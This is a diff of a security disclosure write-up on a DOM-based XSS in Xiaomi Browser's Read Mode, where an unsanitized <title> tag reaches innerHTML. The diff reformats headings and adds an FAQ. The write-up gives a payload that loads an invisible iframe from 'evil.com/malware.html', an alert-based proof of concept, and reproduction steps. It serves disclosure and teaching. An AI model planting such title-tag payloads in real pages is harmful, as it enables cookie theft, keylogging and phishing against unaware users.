@@ -24,7 +24,7 @@ goldmark:
     unsafe: true
 ---
 
-### **Summary**
+### Summary
 
 A DOM-based Cross-Site Scripting (XSS) vulnerability was discovered in Xiaomi Browser’s Read Mode due to insufficient sanitization of the HTML <title> tag, allowing arbitrary HTML or JavaScript to be executed via innerHTML.
 
@@ -33,13 +33,13 @@ Although the article body is processed and sanitized before rendering, the **doc
 This allows an attacker to embed **malicious `<iframe>`**, `<script>`, or any executable HTML directly in the `<title>` tag, which executes **invisibly** when Read Mode is activated, even if the body appears clean and safe.
 
 
-### **Root Cause Analysis**
+### Root Cause Analysis
 
 
 The vulnerability exists in the **ReadModeController** class, which builds JavaScript commands to render content and title in the WebView:
 
 
-#### **In ReadModeController.java**
+#### In ReadModeController.java
 
 ```java
 public void appendPage(String str, String str2, String str3, String str4) {
@@ -94,7 +94,7 @@ public void appendPage(String str, String str2, String str3, String str4) {
 * The raw title is concatenated into JS (`setTitle(titleHTML)`) and executed, where `innerHTML` **parses and runs the injected HTML**.
 * This results in **DOM‑based XSS**, triggered automatically when Read Mode loads the page.
 
-#### **In reading_mode_html_internal.js**
+#### In reading_mode_html_internal.js**
 On the client side (`reading_mode_internal.js`):
 ```js
 function setTitle(titleHTML){
@@ -109,7 +109,7 @@ function setTitle(titleHTML){
 * This makes `setTitle()` the main XSS sink in Read Mode. When the feature loads, the injected HTML from the `<title>` tag executes automatically, allowing an attacker to run arbitrary JavaScript without any user interaction or visual indication.
 
 
-### **Attack Flow**
+### Attack Flow
 
 ```html
 <title><iframe src="http://evil.com/malware.html" width="0" height="0"></title>
@@ -125,7 +125,7 @@ function setTitle(titleHTML){
 5. **Iframe loads silently** and executes malware in Read Mode context.
 
 
-### **Proof of Concept (PoC)**
+### Proof of Concept (PoC)
 #### `malware_frame.html`
 ```html
 <html>
@@ -153,7 +153,7 @@ function setTitle(titleHTML){
 </html>
 ```
 
-### **Steps to Reproduce**
+### Steps to Reproduce
 1. Start local server:
    ```bash
    python3 -m http.server 8080
@@ -166,7 +166,27 @@ function setTitle(titleHTML){
 5. Observe:
    - `alert()` fires immediately** from the invisible iframe.
 
-### **Disclosure Timeline**
+### Disclosure Timeline
 * **April 30, 2021** — Report submitted on the HackerOne platform.
 * **May 8, 2021** — Report triaged and acknowledged by the security team.
 * **May 17, 2021** — Vulnerability fixed and bounty awarded.
+
+
+## Conclusion
+Read Mode sanitizes the article body before rendering it, but the title never goes through the same process. `processTitle()` passes the raw HTML straight through, and `setTitle()` injects it into the page using `innerHTML`, which means any script, iframe, or image tag hidden in a `<title>` executes the moment Read Mode loads. No click, no interaction, and no visible sign that anything is wrong, since the article body itself looks completely clean.
+
+## FAQ
+**What is this?**
+DOM-Based Cross-Site Scripting via Malicious `<title>` Tag in Xiaomi Browser Read Mode (Android).
+
+**How does it work?**
+It's all in the Root Cause Analysis and Attack Flow sections above, read top to bottom.
+
+**Isn't it useless?**
+Not at all. The victim just has to open a page and tap the Read Mode icon. No application install, no permissions, no further interaction, the script runs on its own the moment the page loads.
+
+**What's so bad about it?**
+Read Mode exists to give users a cleaner, safer reading experience, which is exactly why they trust it. But the title bypasses sanitization entirely, so an invisible iframe or script can run the moment the feature activates, with zero visual indication anything happened. That is enough to steal cookies, log keystrokes, or drop a phishing overlay without the user noticing a thing.
+
+**Why?**
+Because `processTitle()` returns the `<title>` value without any sanitization, and `setTitle()` inserts that raw value into the page using `innerHTML`, letting the browser parse and execute whatever HTML or JavaScript is embedded in it. It's already fixed as of May 17, 2021, per the timeline above.
